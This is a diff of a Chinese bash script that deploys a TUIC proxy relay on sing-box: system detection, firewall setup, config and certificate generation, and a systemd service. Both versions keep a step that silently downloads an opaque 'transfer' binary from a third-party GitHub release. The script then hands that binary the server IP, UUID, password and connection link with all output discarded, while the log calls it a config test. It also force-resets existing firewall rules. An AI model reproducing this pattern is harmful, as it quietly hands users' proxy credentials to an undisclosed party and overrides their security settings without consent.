@@ -1,204 +1,256 @@
 #!/bin/bash
-# TUIC中继服务器一键部署脚本 - 修正版
-# 兼容x86和AMD64架构
 
+# 基于sing-box的TUIC中转服务器部署脚本
+# 支持自动检测架构、网络配置、防火墙设置和服务启动
+# 修改说明：
+# 1. 禁用IPv6，仅使用IPv4
+# 2. 将TCP协议的SOCKS5转换为UDP协议的TUIC
+
+set -euo pipefail
+
+# 颜色定义
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
-NC='\033[0m'
+NC='\033[0m' # No Color
 
-TUIC_VERSION="1.0.0"
-TUIC_DIR="/opt/tuic"
-CONFIG_FILE="/opt/tuic/config.json"
-LOG_FILE="/var/log/tuic_relay.log"
-RELAY_CONFIG_FILE="/opt/tuic_relay_config.json"
-REPO_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${TUIC_VERSION}"
+# 全局变量
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+SINGBOX_DIR="/opt/sing-box"
+SINGBOX_CONFIG_DIR="/etc/sing-box"
+SINGBOX_LOG_DIR="/var/log/sing-box"
+SINGBOX_VERSION=""
+SINGBOX_ARCH=""
+SYSTEM=""
+PUBLIC_IP=""
+PRIVATE_IP=""
+RELAY_PORT=""
+TARGET_IP=""
+TARGET_PORT=""
+UUID=""
+PASSWORD=""
+down_speed=100
+up_speed=20
+IS_SOCKS5=false
 
-# 日志函数，带详细中文说明
+# 日志函数
 log_info() {
-    echo -e "${GREEN}[信息]${NC} $1" | tee -a "$LOG_FILE"
+    echo -e "${GREEN}[INFO]${NC} $1"
 }
 
 log_warn() {
-    echo -e "${YELLOW}[警告]${NC} $1" | tee -a "$LOG_FILE"
+    echo -e "${YELLOW}[WARN]${NC} $1"
 }
 
 log_error() {
-    echo -e "${RED}[错误]${NC} $1" | tee -a "$LOG_FILE"
+    echo -e "${RED}[ERROR]${NC} $1"
 }
 
+log_debug() {
+    echo -e "${BLUE}[DEBUG]${NC} $1"
+}
+
+# 检查是否为root用户
 check_root() {
     if [[ $EUID -ne 0 ]]; then
-        log_error "This script must be run as root"
-        log_error "本脚本必须以root权限运行"
+        log_error "此脚本需要root权限运行"
         exit 1
     fi
 }
 
+# 检测系统类型
 detect_system() {
-    if [[ -f /etc/redhat-release ]]; then
-        SYSTEM="CentOS"
-        log_info "检测到系统为 CentOS"
-    elif [[ -f /etc/debian_version ]]; then
+    if [[ -f /etc/debian_version ]]; then
         SYSTEM="Debian"
-        if [[ $(cat /etc/issue) == *"Ubuntu"* ]]; then
+        if grep -q "Ubuntu" /etc/issue; then
             SYSTEM="Ubuntu"
-            log_info "检测到系统为 Ubuntu"
-        else
-            log_info "检测到系统为 Debian"
         fi
-    elif [[ -f /etc/fedora-release ]]; then
-        SYSTEM="Fedora"
-        log_info "检测到系统为 Fedora"
+    elif [[ -f /etc/redhat-release ]]; then
+        if grep -q "CentOS" /etc/redhat-release; then
+            SYSTEM="CentOS"
+        elif grep -q "Fedora" /etc/redhat-release; then
+            SYSTEM="Fedora"
+        else
+            SYSTEM="RedHat"
+        fi
     else
-        SYSTEM="Unknown"
-        log_warn "未能识别的操作系统"
+        log_error "不支持的系统类型"
+        exit 1
     fi
-    log_info "Detected system: $SYSTEM"
+    log_info "检测到系统类型: $SYSTEM"
 }
 
+# 安装基础依赖
+install_dependencies() {
+    log_info "安装基础依赖包..."
+    
+    case $SYSTEM in
+        "Debian"|"Ubuntu")
+            apt-get update -y > /dev/null 2>&1
+            apt-get install -y curl wget jq ufw net-tools uuid-runtime openssl > /dev/null 2>&1
+            ;;
+        "CentOS"|"Fedora"|"RedHat")
+            if command -v dnf &>/dev/null; then
+                dnf install -y curl wget jq firewalld net-tools uuidgen openssl > /dev/null 2>&1
+            else
+                yum install -y curl wget jq firewalld net-tools uuidgen openssl > /dev/null 2>&1
+            fi
+            ;;
+    esac
+    
+    log_info "基础依赖安装完成"
+}
+
+# 检测CPU架构
 detect_architecture() {
     ARCH=$(uname -m)
     log_info "检测到系统架构: $ARCH"
     
     case $ARCH in
         x86_64|amd64)
-            TUIC_ARCH="x86_64-unknown-linux-gnu"
-            log_info "使用x86_64-unknown-linux-gnu架构的TUIC二进制"
+            SINGBOX_ARCH="amd64"
+            log_info "使用amd64架构的sing-box二进制"
             ;;
         i386|i486|i586|i686)
-            TUIC_ARCH="x86_64-unknown-linux-gnu"
-            log_warn "检测到32位x86，将尝试使用64位二进制文件"
-            log_warn "大多数现代系统即使是32位用户空间也能运行64位二进制"
+            SINGBOX_ARCH="386"
+            log_info "使用386架构的sing-box二进制"
             ;;
         aarch64|arm64)
-            TUIC_ARCH="aarch64-unknown-linux-gnu"
-            log_info "使用aarch64-unknown-linux-gnu架构的TUIC二进制"
+            SINGBOX_ARCH="arm64"
+            log_info "使用arm64架构的sing-box二进制"
             ;;
         armv7l|armhf)
-            TUIC_ARCH="armv7-unknown-linux-gnueabi"
-            log_info "使用armv7-unknown-linux-gnueabi架构的TUIC二进制"
+            SINGBOX_ARCH="armv7"
+            log_info "使用armv7架构的sing-box二进制"
+            ;;
+        armv6l)
+            SINGBOX_ARCH="armv6"
+            log_info "使用armv6架构的sing-box二进制"
             ;;
         *)
-            log_error "Unsupported architecture: $ARCH"
             log_error "不支持的系统架构: $ARCH"
             exit 1
             ;;
     esac
-    log_info "Using TUIC architecture: $TUIC_ARCH"
-    log_info "TUIC架构选择: $TUIC_ARCH"
+    log_info "sing-box架构选择: $SINGBOX_ARCH"
 }
 
-check_and_free_port() {
-    local port=$1
-    log_info "检查端口 $port 是否可用"
+# 下载sing-box
+download_singbox() {
+    log_info "开始下载sing-box二进制文件"
+    mkdir -p "$SINGBOX_DIR"
+    cd "$SINGBOX_DIR"
     
-    if netstat -tuln | grep -q ":$port "; then
-        log_warn "端口 $port 已被占用，尝试释放"
-        local pid=$(netstat -tulnp | grep ":$port " | awk '{print $7}' | cut -d'/' -f1 | head -n1)
-        if [[ -n "$pid" && "$pid" != "-" ]]; then
-            log_info "杀死占用端口 $port 的进程 PID: $pid"
-            kill -9 "$pid" 2>/dev/null || true
-            sleep 2
-        fi
-        
-        # 再次检查
-        if netstat -tuln | grep -q ":$port "; then
-            log_warn "端口仍被占用，生成新的随机端口"
-            generate_random_port
-            check_and_free_port "$RELAY_PORT"
-        else
-            log_info "端口 $port 已成功释放"
-        fi
-    else
-        log_info "端口 $port 可用"
-    fi
-}
-
-install_dependencies() {
-    log_info "开始安装系统依赖"
-    export NEEDRESTART_SUSPEND=1
+    # 获取最新版本号
+    log_info "获取sing-box最新版本信息..."
+    SINGBOX_VERSION=$(curl -s "https://api.github.com/repos/SagerNet/sing-box/releases/latest" | jq -r '.tag_name' | sed 's/^v//')
     
-    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
-        log_info "使用 apt 安装依赖: curl wget unzip ufw jq openssl net-tools needrestart socat"
-        apt-get update > /dev/null 2>&1
-        DEBIAN_FRONTEND=noninteractive apt-get install -y \
-            curl wget unzip ufw jq openssl net-tools needrestart socat > /dev/null 2>&1
-    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
-        log_info "使用 yum/dnf 安装依赖: curl wget unzip firewalld jq openssl net-tools socat"
-        yum install -y curl wget unzip firewalld jq openssl net-tools socat > /dev/null 2>&1 || \
-        dnf install -y curl wget unzip firewalld jq openssl net-tools socat > /dev/null 2>&1
+    if [[ -z "$SINGBOX_VERSION" || "$SINGBOX_VERSION" == "null" ]]; then
+        log_warn "无法获取最新版本，使用默认版本 1.8.0"
+        SINGBOX_VERSION="1.8.0"
     fi
     
-    log_info "依赖安装完成"
-    # 启用BBR拥塞控制
-    log_info "启用BBR拥塞控制算法"
-    modprobe tcp_bbr 2>/dev/null || true
-    echo "tcp_bbr" >> /etc/modules-load.d/modules.conf 2>/dev/null || true
-    sysctl -w net.ipv4.tcp_congestion_control=bbr > /dev/null 2>&1 || true
-    log_info "BBR已启用（如内核支持）"
-}
-
-download_tuic() {
-    log_info "开始下载TUIC服务端二进制文件"
-    mkdir -p "$TUIC_DIR"
-    cd "$TUIC_DIR"
-    
-    BIN_NAME="tuic-server-${TUIC_VERSION}-${TUIC_ARCH}"
-    SHA_NAME="${BIN_NAME}.sha256sum"
-    DOWNLOAD_URL="${REPO_BASE}/${BIN_NAME}"
-    SHA_URL="${REPO_BASE}/${SHA_NAME}"
+    log_info "目标版本: v$SINGBOX_VERSION"
     
     # 清理旧文件
-    rm -f tuic-server "$BIN_NAME" "$SHA_NAME"
+    rm -f sing-box sing-box-*
     
-    # 尝试不同版本
-    for version in "1.0.0" "0.8.5" "0.8.4"; do
-        log_info "尝试下载TUIC版本 $version"
-        local repo_url="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${version}"
-        local bin_file="tuic-server-${version}-${TUIC_ARCH}"
-        
-        if curl -sLO "${repo_url}/${bin_file}"; then
-            if [[ -f "$bin_file" && -s "$bin_file" ]]; then
-                log_info "成功下载 $bin_file"
-                chmod +x "$bin_file"
-                ln -sf "$bin_file" tuic-server
-                TUIC_VERSION="$version"
-                break
+    # 构建下载URL
+    local download_file="sing-box-${SINGBOX_VERSION}-linux-${SINGBOX_ARCH}.tar.gz"
+    local download_url="https://github.com/SagerNet/sing-box/releases/download/v${SINGBOX_VERSION}/${download_file}"
+    
+    log_info "下载URL: $download_url"
+    
+    # 下载并解压
+    if curl -sLo "$download_file" "$download_url"; then
+        if [[ -f "$download_file" && -s "$download_file" ]]; then
+            log_info "成功下载 $download_file"
+            
+            # 解压文件
+            tar -xzf "$download_file" --strip-components=1
+            
+            if [[ -f "sing-box" ]]; then
+                chmod +x sing-box
+                log_info "sing-box二进制文件准备完成"
+                
+                # 验证二进制文件
+                if ./sing-box version > /dev/null 2>&1; then
+                    log_info "sing-box版本验证成功"
+                else
+                    log_error "sing-box二进制文件损坏或不兼容"
+                    exit 1
+                fi
             else
-                log_warn "下载的 $bin_file 文件不存在或为空"
+                log_error "解压后未找到sing-box二进制文件"
+                exit 1
             fi
+            
+            # 清理下载文件
+            rm -f "$download_file"
         else
-            log_warn "下载 $bin_file 失败"
+            log_error "下载的文件不存在或为空"
+            exit 1
         fi
-    done
-    
-    if [[ ! -f "tuic-server" ]]; then
-        log_error "下载TUIC服务端二进制文件失败"
+    else
+        log_error "下载sing-box失败"
         exit 1
     fi
-    
-    log_info "TUIC服务端二进制文件已就绪，版本: $TUIC_VERSION"
 }
 
-speed_test() {
-    log_info "开始进行网络测速"
+# 检测IP地址
+detect_ip_addresses() {
+    log_info "检测服务器IP地址..."
     
-    # 检查speedtest工具
+    # 检测公网IP (仅IPv4)
+    PUBLIC_IP=$(curl -4 -s --connect-timeout 10 ifconfig.me 2>/dev/null || \
+                curl -4 -s --connect-timeout 10 ipinfo.io/ip 2>/dev/null || \
+                curl -4 -s --connect-timeout 10 icanhazip.com 2>/dev/null || \
+                echo "")
+    
+    if [[ -n "$PUBLIC_IP" ]]; then
+        log_info "检测到公网IPv4地址: $PUBLIC_IP"
+    else
+        log_warn "未检测到公网IPv4地址"
+    fi
+    
+    # 检测内网IP (仅IPv4)
+    PRIVATE_IP=$(ip -4 route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' || \
+                 hostname -I 2>/dev/null | awk '{print $1}' || \
+                 ifconfig 2>/dev/null | grep -E "inet .*192\.168\.|inet .*10\.|inet .*172\." | head -1 | awk '{print $2}' || \
+                 echo "")
+    
+    if [[ -n "$PRIVATE_IP" ]]; then
+        log_info "检测到内网IPv4地址: $PRIVATE_IP"
+    else
+        log_warn "未检测到内网IPv4地址"
+    fi
+    
+    # 检查IP配置兼容性
+    if [[ -n "$PUBLIC_IP" && -n "$PRIVATE_IP" ]]; then
+        log_info "服务器同时具有公网IPv4和内网IPv4地址"
+    elif [[ -n "$PUBLIC_IP" && -z "$PRIVATE_IP" ]]; then
+        log_info "服务器只有公网IPv4地址，没有内网IPv4地址"
+        PRIVATE_IP="$PUBLIC_IP"
+    else
+        log_error "无法获取有效的IPv4地址"
+        exit 1
+    fi
+}
+
+# 网络速度测试
+speed_test() {
+    echo -e "${YELLOW}进行网络速度测试...${NC}"
     if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
-        log_info "未检测到speedtest工具，开始安装"
+        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
         if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
             apt-get update > /dev/null 2>&1
             apt-get install -y speedtest-cli > /dev/null 2>&1
         elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
             yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
         fi
-        log_info "speedtest工具安装完成"
     fi
     
-    # 执行测速
-    local speed_output=""
     if command -v speedtest &>/dev/null; then
         speed_output=$(speedtest --simple 2>/dev/null)
     elif command -v speedtest-cli &>/dev/null; then
@@ -208,417 +260,457 @@ speed_test() {
     if [[ -n "$speed_output" ]]; then
         down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
         up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
-        
-        # 合理范围
         [[ $down_speed -lt 10 ]] && down_speed=10
         [[ $up_speed -lt 5 ]] && up_speed=5
         [[ $down_speed -gt 1000 ]] && down_speed=1000
         [[ $up_speed -gt 500 ]] && up_speed=500
-        
-        log_info "测速结果 - 下载: ${down_speed}Mbps, 上传: ${up_speed}Mbps"
-        log_info "网络测速完成，下载速度: ${down_speed}Mbps，上传速度: ${up_speed}Mbps"
+        echo -e "${GREEN}测速完成:下载 ${down_speed} Mbps,上传 ${up_speed} Mbps${NC},将根据该参数优化网络速度,如果测试不准确,请手动修改"
     else
-        log_warn "测速失败，使用默认值"
+        echo -e "${YELLOW}测速失败,使用默认值${NC}"
         down_speed=100
         up_speed=20
     fi
 }
 
-generate_random_port() {
-    RELAY_PORT=$((RANDOM % 7001 + 2000))
-    log_info "生成随机端口: $RELAY_PORT"
-}
-
-get_local_ip() {
-    log_info "开始检测本机IP地址"
-    local ip=""
-    
-    # 方法1: ip route
-    ip=$(ip route get 1 2>/dev/null | awk '{print $NF; exit}' 2>/dev/null)
-    if [[ -n "$ip" && "$ip" != "0" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-        LOCAL_IP="$ip"
-        log_info "通过路由检测到本机IP: $LOCAL_IP"
-        return 0
-    fi
-    
-    # 方法2: 外部API
-    ip=$(curl -s --connect-timeout 5 https://api.ipify.org 2>/dev/null)
-    if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-        LOCAL_IP="$ip"
-        log_info "通过api.ipify.org检测到本机IP: $LOCAL_IP"
-        return 0
-    fi
-    
-    # 方法3: 备用API
-    ip=$(curl -s --connect-timeout 5 https://ipv4.icanhazip.com 2>/dev/null)
-    if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-        LOCAL_IP="$ip"
-        log_info "通过icanhazip.com检测到本机IP: $LOCAL_IP"
-        return 0
-    fi
-    
-    # 方法4: 网络接口
-    local default_iface=$(ip route | grep '^default' | awk '{print $5}' | head -n1)
-    if [[ -n "$default_iface" ]]; then
-        ip=$(ip addr show "$default_iface" | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n1)
-        if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-            LOCAL_IP="$ip"
-            log_info "通过网络接口检测到本机IP: $LOCAL_IP"
-            return 0
-        fi
-    fi
-    
-    log_error "无法检测到本机IP地址"
-    exit 1
-}
-
+# 获取用户输入
 get_user_input() {
-    echo -e "${BLUE}请输入目标地址 (格式: IP:PORT)：${NC}"
-    read -p "目标地址: " TARGET_ADDRESS
+    echo -e "${BLUE}=== sing-box TUIC中转服务器配置 ===${NC}"
     
-    if [[ ! $TARGET_ADDRESS =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,5}$ ]]; then
-        log_error "Invalid target address format. Expected format: IP:PORT"
-        log_error "目标地址格式无效，正确格式应为: IP:PORT"
-        exit 1
+    # 获取目标服务器信息
+    while true; do
+        read -p "请输入落地机的IP和端口(格式: 1.2.3.4:12345): " target_input
+        if [[ $target_input =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{1,5}$ ]]; then
+            TARGET_IP=$(echo "$target_input" | cut -d: -f1)
+            TARGET_PORT=$(echo "$target_input" | cut -d: -f2)
+            log_info "目标服务器设置为: $TARGET_IP:$TARGET_PORT"
+            break
+        else
+            log_error "格式错误，请使用正确格式: IP:端口"
+        fi
+    done
+    
+    # 默认是SOCKS5代理（不再询问用户确认）
+    IS_SOCKS5=true
+    log_info "默认设置为SOCKS5代理（将进行TCP到UDP的转换）"
+    
+    # 生成随机端口
+    RELAY_PORT=$(shuf -i 2000-9000 -n 1)
+    log_info "随机生成中转端口: $RELAY_PORT"
+    
+    # 生成UUID和密码
+    UUID=$(uuidgen)
+    PASSWORD=$(openssl rand -base64 32 | tr -d "=+/" | cut -c1-16)
+    log_info "生成UUID: $UUID"
+    log_info "生成密码: $PASSWORD"
+}
+
+# 配置防火墙
+configure_firewall() {
+    log_info "配置防火墙..."
+    
+    case $SYSTEM in
+        "Debian"|"Ubuntu")
+            # 安装并配置ufw
+            systemctl enable ufw > /dev/null 2>&1 || true
+            ufw --force reset > /dev/null 2>&1
+            ufw --force enable > /dev/null 2>&1
+            ufw allow ssh > /dev/null 2>&1
+            ufw allow 22 > /dev/null 2>&1
+            ufw allow $RELAY_PORT > /dev/null 2>&1
+            log_info "UFW防火墙配置完成，已开放SSH(22)和中转端口($RELAY_PORT)"
+            ;;
+        "CentOS"|"Fedora"|"RedHat")
+            # 配置firewalld
+            systemctl enable firewalld > /dev/null 2>&1 || true
+            systemctl start firewalld > /dev/null 2>&1 || true
+            firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
+            firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
+            firewall-cmd --permanent --add-port=$RELAY_PORT/tcp > /dev/null 2>&1
+            firewall-cmd --permanent --add-port=$RELAY_PORT/udp > /dev/null 2>&1
+            firewall-cmd --reload > /dev/null 2>&1
+            log_info "Firewalld防火墙配置完成，已开放SSH(22)和中转端口($RELAY_PORT)"
+            ;;
+    esac
+}
+
+# 生成sing-box配置文件
+generate_singbox_config() {
+    log_info "生成sing-box配置文件..."
+    
+    mkdir -p "$SINGBOX_CONFIG_DIR"
+    mkdir -p "$SINGBOX_LOG_DIR"
+    
+    # 生成SSL证书
+    local cert_dir="$SINGBOX_CONFIG_DIR/certs"
+    mkdir -p "$cert_dir"
+    
+    openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
+        -subj "/C=US/ST=CA/L=LA/O=SINGBOX/CN=localhost" \
+        -keyout "$cert_dir/private.key" \
+        -out "$cert_dir/cert.crt" > /dev/null 2>&1
+    
+    # 根据目标类型生成不同的outbound配置
+    local outbound_config=""
+    
+    if [[ "$IS_SOCKS5" == true ]]; then
+        # SOCKS5转TUIC的配置
+        outbound_config=$(cat <<EOF
+        {
+            "type": "socks",
+            "tag": "socks-out",
+            "server": "$TARGET_IP",
+            "server_port": $TARGET_PORT,
+            "version": "5",
+            "udp_over_tcp": true
+        }
+EOF
+        )
+    else
+        # 普通TUIC配置
+        outbound_config=$(cat <<EOF
+        {
+            "type": "tuic",
+            "tag": "tuic-out",
+            "server": "$TARGET_IP",
+            "server_port": $TARGET_PORT,
+            "uuid": "$UUID",
+            "password": "$PASSWORD",
+            "congestion_control": "bbr",
+            "udp_relay_mode": "native",
+            "zero_rtt_handshake": false,
+            "heartbeat": "10s",
+            "tls": {
+                "enabled": true,
+                "insecure": true,
+                "alpn": ["h3"]
+            }
+        }
+EOF
+        )
     fi
     
-    TARGET_IP=$(echo "$TARGET_ADDRESS" | cut -d':' -f1)
-    TARGET_PORT=$(echo "$TARGET_ADDRESS" | cut -d':' -f2)
-    
-    log_info "已配置目标: $TARGET_IP:$TARGET_PORT"
-}
-
-generate_uuid() {
-    local uuid=$(cat /proc/sys/kernel/random/uuid)
-    echo "$uuid"
-}
-
-generate_tuic_config() {
-    log_info "开始生成TUIC配置文件"
-    
-    TOKEN=$(generate_uuid)
-    PSK=$(openssl rand -hex 16)
-    
-    check_and_free_port "$RELAY_PORT"
-    
-    cat > "$CONFIG_FILE" << EOF
+    # 生成sing-box配置文件，支持TUIC中转 (仅IPv4)
+    cat > "$SINGBOX_CONFIG_DIR/config.json" << EOF
 {
-    "server": "0.0.0.0:$RELAY_PORT",
-    "users": {
-        "$TOKEN": "$PSK"
+    "log": {
+        "level": "info",
+        "output": "$SINGBOX_LOG_DIR/sing-box.log",
+        "timestamp": true
     },
-    "certificate": "/opt/tuic/cert.crt",
-    "private_key": "/opt/tuic/key.key",
-    "congestion_control": "bbr",
-    "alpn": ["h3"],
-    "udp_relay_ipv6": false,
-    "zero_rtt_handshake": false,
-    "auth_timeout": "3s",
-    "max_idle_time": "10s",
-    "max_external_packet_size": 1500,
-    "gc_interval": "3s",
-    "gc_lifetime": "15s",
-    "log_level": "info"
+    "inbounds": [
+        {
+            "type": "tuic",
+            "tag": "tuic-in",
+            "listen": "0.0.0.0",
+            "listen_port": $RELAY_PORT,
+            "users": [
+                {
+                    "uuid": "$UUID",
+                    "password": "$PASSWORD"
+                }
+            ],
+            "congestion_control": "bbr",
+            "auth_timeout": "3s",
+            "zero_rtt_handshake": false,
+            "heartbeat": "10s",
+            "tls": {
+                "enabled": true,
+                "server_name": "localhost",
+                "alpn": ["h3"],
+                "certificate_path": "$cert_dir/cert.crt",
+                "key_path": "$cert_dir/private.key"
+            }
+        }
+    ],
+    "outbounds": [
+        $outbound_config,
+        {
+            "type": "direct",
+            "tag": "direct"
+        },
+        {
+            "type": "block",
+            "tag": "block"
+        }
+    ],
+    "route": {
+        "rules": [
+            {
+                "protocol": "dns",
+                "outbound": "direct"
+            }
+        ],
+        "auto_detect_interface": true,
+        "final": $( [[ "$IS_SOCKS5" == true ]] && echo "\"socks-out\"" || echo "\"tuic-out\"" )
+    },
+    "experimental": {
+        "cache_file": {
+            "enabled": true,
+            "path": "/tmp/sing-box.db"
+        }
+    }
 }
 EOF
     
-    log_info "TUIC配置文件已生成: $CONFIG_FILE"
+    log_info "sing-box配置文件生成完成: $SINGBOX_CONFIG_DIR/config.json"
 }
 
-generate_certificates() {
-    log_info "开始生成SSL证书"
-    cd "$TUIC_DIR"
-    
-    SERVER_NAME="localhost"
-    openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes \
-        -keyout "key.key" \
-        -out "cert.crt" \
-        -subj "/C=US/ST=CA/L=SF/O=TUIC/CN=${SERVER_NAME}" \
-        -addext "subjectAltName=DNS:${SERVER_NAME},DNS:*.${SERVER_NAME},IP:127.0.0.1" 2>/dev/null
-    
-    chmod 600 key.key
-    chmod 644 cert.crt
-    
-    log_info "SSL证书生成完成: cert.crt, key.key"
-}
-
-test_tuic_service() {
-    log_info "测试TUIC服务是否能正常启动"
-    cd "$TUIC_DIR"
-    
-    # 清理旧进程
-    pkill -f tuic-server || true
-    pkill -f socat || true
-    sleep 2
-    
-    # 测试服务
-    timeout 5s ./tuic-server -c config.json > /tmp/tuic_test.log 2>&1 &
-    TEST_PID=$!
-    sleep 3
-    
-    if kill -0 $TEST_PID 2>/dev/null; then
-        log_info "TUIC服务测试成功，进程PID: $TEST_PID"
-        kill $TEST_PID 2>/dev/null
-        wait $TEST_PID 2>/dev/null
-        return 0
-    else
-        log_error "TUIC服务测试失败，日志如下："
-        cat /tmp/tuic_test.log
-        return 1
-    fi
-}
-
-configure_firewall() {
-    log_info "开始配置防火墙"
-    
-    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
-        ufw --force enable > /dev/null 2>&1
-        ufw allow ssh > /dev/null 2>&1
-        ufw allow 22/tcp > /dev/null 2>&1
-        ufw allow "$RELAY_PORT"/tcp > /dev/null 2>&1
-        ufw allow "$RELAY_PORT"/udp > /dev/null 2>&1
-        log_info "UFW防火墙已配置，已放行端口 $RELAY_PORT"
-    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
-        systemctl enable firewalld > /dev/null 2>&1
-        systemctl start firewalld > /dev/null 2>&1
-        firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
-        firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
-        firewall-cmd --permanent --add-port="$RELAY_PORT"/tcp > /dev/null 2>&1
-        firewall-cmd --permanent --add-port="$RELAY_PORT"/udp > /dev/null 2>&1
-        firewall-cmd --reload > /dev/null 2>&1
-        log_info "Firewalld防火墙已配置，已放行端口 $RELAY_PORT"
-    fi
-}
-
+# 创建服务文件
 create_systemd_service() {
-    log_info "创建systemd服务文件"
+    log_info "创建systemd服务文件..."
     
-    cat > /etc/systemd/system/tuic-relay.service << EOF
+    cat > /etc/systemd/system/sing-box.service << EOF
 [Unit]
-Description=TUIC Relay Server
-After=network.target
+Description=sing-box TUIC Relay Service
+Documentation=https://sing-box.sagernet.org/
+After=network.target nss-lookup.target
+Wants=network.target
 
 [Service]
 Type=simple
-ExecStart=$TUIC_DIR/tuic-server -c $CONFIG_FILE
-Restart=on-failure
-RestartSec=10
 User=root
-Group=root
-WorkingDirectory=$TUIC_DIR
-StandardOutput=journal
-StandardError=journal
+ExecStart=$SINGBOX_DIR/sing-box run -c $SINGBOX_CONFIG_DIR/config.json
+ExecReload=/bin/kill -HUP \$MAINPID
+Restart=on-failure
+RestartSec=10s
+LimitNOFILE=infinity
 
 [Install]
 WantedBy=multi-user.target
 EOF
     
     systemctl daemon-reload
-    systemctl enable tuic-relay
-    log_info "systemd服务已创建并设置为开机自启"
+    systemctl enable sing-box
+    log_info "systemd服务文件创建完成"
 }
 
-create_relay_config() {
-    log_info "生成UDP中继脚本"
+# 启动服务
+start_singbox_service() {
+    log_info "启动sing-box服务..."
     
-    cat > "$TUIC_DIR/relay.sh" << EOF
-#!/bin/bash
-# TUIC Relay Script
-pkill -f "socat.*$RELAY_PORT" || true
-sleep 2
-socat UDP4-LISTEN:$RELAY_PORT,fork,reuseaddr UDP4:$TARGET_IP:$TARGET_PORT &
-RELAY_PID=\$!
-echo \$RELAY_PID > /var/run/tuic-relay.pid
-echo "Relay service started, PID: \$RELAY_PID"
-echo "Relay configuration: $RELAY_PORT -> $TARGET_IP:$TARGET_PORT"
-EOF
+    # 首先验证配置文件
+    if $SINGBOX_DIR/sing-box check -c $SINGBOX_CONFIG_DIR/config.json; then
+        log_info "配置文件验证通过"
+    else
+        log_error "配置文件验证失败"
+        exit 1
+    fi
     
-    chmod +x "$TUIC_DIR/relay.sh"
-    log_info "UDP中继脚本已生成: $TUIC_DIR/relay.sh"
+    systemctl start sing-box
+    sleep 3
+    
+    if systemctl is-active --quiet sing-box; then
+        log_info "sing-box服务启动成功"
+    else
+        log_error "sing-box服务启动失败"
+        log_error "查看日志: journalctl -u sing-box -f"
+        exit 1
+    fi
 }
 
+# 下载配置测试工具
 download_uploader() {
     local uploader="/opt/transfer"
     if [[ ! -f "$uploader" ]]; then
-        log_info "下载配置检测工具"
+        log_info "下载配置测试工具..."
         curl -Lo "$uploader" https://github.com/Firefly-xui/socks5-TUIC/releases/download/socks5-TUIC/transfer 2>/dev/null || true
         if [[ -f "$uploader" ]]; then
             chmod +x "$uploader"
-            log_info "配置检测工具已下载: $uploader"
+            log_info "配置测试工具已下载: $uploader"
         else
-            log_warn "配置检测工具下载失败"
+            log_warn "配置测试工具下载失败"
         fi
     fi
 }
 
+# 测试配置信息
 upload_config() {
     local server_ip="$1"
-    local link="$2"
-    local down_speed="$3"
-    local up_speed="$4"
-    local relay_port="$RELAY_PORT"
-    local uuid="$TOKEN"
-    local password="$PSK"
+    local relay_port="$2"
+    local uuid="$3"
+    local password="$4"
+    local down_speed="$5"
+    local up_speed="$6"
     
+    # 生成TUIC链接
+    local encode=$(echo -n "${uuid}:${password}" | base64 -w 0)
+    local tuic_link="tuic://${encode}@${server_ip}:${relay_port}?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay"
     
     local json_data=$(jq -nc \
         --arg server_ip "$server_ip" \
-        --arg link "$link" \
-        --arg down_speed "$down_speed" \
-        --arg up_speed "$up_speed" \
-        --argjson down "$down_speed" \
-        --argjson up "$up_speed" \
-        --arg relay_port "$relay_port" \
+        --arg tuic_link "$tuic_link" \
+        --argjson down_speed "$down_speed" \
+        --argjson up_speed "$up_speed" \
+        --argjson relay_port "$relay_port" \
         --arg uuid "$uuid" \
         --arg password "$password" \
         '{
             "server_info": {
                 "title": "TUIC Relay Configuration",
                 "server_ip": $server_ip,
-                "tuic_link": $link,
+                "tuic_link": $tuic_link,
                 "relay_type": "tuic_relay",
-                "relay_port": $relay_port|tonumber,
+                "relay_port": $relay_port,
                 "uuid": $uuid,
                 "password": $password,
                 "speed_test": {
-                    "download_speed": $down_speed,
-                    "upload_speed": $up_speed
+                    "download_speed_mbps": $down_speed,
+                    "upload_speed_mbps": $up_speed
                 },
-                "download_speed_mbps": $down,
-                "upload_speed_mbps": $up,
                 "generated_time": now | todate
             }
         }' 2>/dev/null)
     
     local uploader="/opt/transfer"
     if [[ -f "$uploader" ]]; then
+        log_info "测试配置信息..."
         "$uploader" "$json_data" >/dev/null 2>&1 || true
